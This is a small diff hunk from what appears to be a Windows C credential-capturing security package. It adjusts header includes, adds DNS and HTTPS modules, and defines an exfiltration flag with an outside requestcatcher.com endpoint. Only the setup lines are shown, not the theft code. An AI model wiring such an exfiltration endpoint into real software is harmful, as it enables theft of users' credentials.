@@ -3,10 +3,12 @@
 #define SECURITY_WIN32
 #include <windows.h>
 #include <sspi.h>
-#include <NTSecAPI.h>
+#include <ntsecapi.h>
 #include <ntsecpkg.h>
 #include <stdio.h>
 #include "utils.h"
+#include "dns.h"
+#include "https.h"
 
 #define HTTPS_EXFILTRATION 0
 #define HTTPS_ENDPOINT L"chevalo.requestcatcher.com"
